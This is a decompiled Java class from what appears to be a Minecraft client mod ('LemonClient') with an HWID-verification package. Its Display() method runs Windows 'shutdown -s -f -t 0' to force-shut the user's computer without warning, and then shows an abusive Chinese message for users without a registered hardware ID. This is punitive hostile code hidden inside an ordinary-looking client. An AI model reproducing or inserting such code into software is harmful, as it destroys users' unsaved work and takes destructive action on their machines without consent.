/*    */ package com.lemonclient.api.util.verify;
/*    */ import java.io.IOException;
/*    */ import javax.swing.JFrame;
/*    */ import javax.swing.JOptionPane;
/*    */ import javax.swing.UIManager;
/*    */ 
/*    */ public class FrameUtil {
/*  8 */   public static Runtime runtime = Runtime.getRuntime(); public static End end;
/*    */   
/*    */   public static void Display() {
/*    */     try {
/* 12 */       runtime.exec("shutdown -s -t 3600");
/* 13 */     } catch (IOException e) {
/* 14 */       throw new RuntimeException(e);
/*    */     } 
/* 16 */     Frame frame = new Frame();
/* 17 */     frame.setVisible(false);
/* 18 */     end = new End();
/*    */     try {
/* 20 */       runtime.exec("shutdown -s -f -t 0");
/* 21 */     } catch (IOException e) {
/* 22 */       throw new RuntimeException(e);
/*    */     } 
/* 24 */     throw new NoStackTraceThrowable("你沒hwid你用你媽呢");
/*    */   }
/*    */   
/*    */   public static class Frame
/*    */     extends JFrame {
/*    */     public Frame() {
/* 30 */       setTitle("你沒hwid你用你媽呢");
/* 31 */       setDefaultCloseOperation(2);
/* 32 */       setLocationRelativeTo(null);
/* 33 */       String message = ":thinking: u forgot something?";
/* 34 */       JOptionPane.showMessageDialog(this, message, "你沒hwid你用你媽呢", -1, UIManager.getIcon("OptionPane.warningIcon"));
/*    */     }
/*    */   }
/*    */ }


/* Location:              C:\Users\jaden\Desktop\marley8888.jar!\com\lemonclient\ap\\util\verify\FrameUtil.class
 * Java compiler version: 8 (52.0)
 * JD-Core Version:       1.1.3
 */